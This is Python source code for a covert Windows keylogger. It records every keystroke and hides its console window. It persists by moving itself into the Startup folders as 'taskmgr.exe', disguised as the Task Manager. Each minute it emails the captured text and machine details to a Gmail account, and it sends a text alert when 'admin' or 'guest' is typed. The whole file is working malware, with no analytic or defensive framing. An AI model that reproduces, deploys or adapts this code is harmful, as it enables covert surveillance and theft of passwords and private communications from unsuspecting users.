#!c:\Python\python.exe
import pythoncom, pyHook
import os
import sys
import threading
import smtplib
import datetime,time
import win32event, win32api, winerror


#Hide Console
def hide():
    import win32console,win32gui
    window = win32console.GetConsoleWindow()
    win32gui.ShowWindow(window,0)
    return True

#Hide Console
def show():
	import win32console,win32gui
	window = win32console.GetConsoleWindow()
	win32gui.ShowWindow(window,1)
	return True

	
#Send Email
def sendMail(to, msg):
	server = smtplib.SMTP()
	server.connect("smtp.gmail.com",587)
	server.starttls()
	server.login("username","password")
	server.sendmail("username", to , msg)
	server.quit()
	
#Email Logs
class TimerClass(threading.Thread):
    def __init__(self):
		#Spawn thread for mail
        threading.Thread.__init__(self)
        self.event = threading.Event()
    def run(self):
        while not self.event.is_set():
			global data
			#Abort if username is typed
			if data.find("usernmae") > -1:
				show()
				print "Successful quit"
				myPID = win32api.GetCurrentProcessId()
				os.system("taskkill /pid " + str(myPID))
				exit(0)
			#Craft txt to send
			ts = datetime.datetime.now()
			SUBJECT = win32api.GetComputerName() + " : " +  win32api.GetDomainName()
			if len(data) == 0:
				data += "Someone's not typing..."
			local_data = data
			
			message = """\
From: %s
To: %s
Subject: %s
%s
""" % ("username", "username@gmail.com", SUBJECT, local_data)
			#Send mail off
			sendMail("username@gmail.com",message)
			lowerData = data.lower()
			#Txt me if a password was found
			if lowerData.find("admin") >= 0 or lowerData.find("guest") >= 0:
				sendMail("attnt#@txt.att.net",message)	
			print message + "\n"
			data=''
			message = ''
			#Send every x seconds
			self.event.wait(60)

def emailStart():
	hide()
	email=TimerClass()
	email.start()
	return True
	
def keypressed(event):
	global data
	keys = ''
	if event.Ascii==13:
		keys='<ENTER>'
	elif event.Ascii==8 and len(data) > 0:
		#Avoid backspacing too much 
		data = data[:-1]
	elif event.Ascii==9:
		keys='<TAB>'
	else:
		keys=chr(event.Ascii)
	data += keys

	#----Main Begins----

#Disallowing Multiple Instance
mutex = win32event.CreateMutex(None, 1, 'mutex_var_xboz')
if win32api.GetLastError() == winerror.ERROR_ALREADY_EXISTS:
	print "Multiple Instance not Allowed"
	mutex = None
	exit(0)
data=''

#Move to startup

cwd = os.getcwd()
startup1 = "\"C:\ProgramData\Microsoft\Windows\Start Menu\Programs\Startup\""
startup2 = "\"C:\Documents and Settings\All Users\Start Menu\Programs\Startup\""
command = "move " + cwd + "\\taskmgr.exe " + startup2
os.system(command)

command = "move " + cwd + "\\taskmgr.exe " + startup1 
os.system(command)


emailStart()
#Hook key events
obj = pyHook.HookManager()
obj.KeyDown = keypressed
obj.HookKeyboard()
pythoncom.PumpMessages()


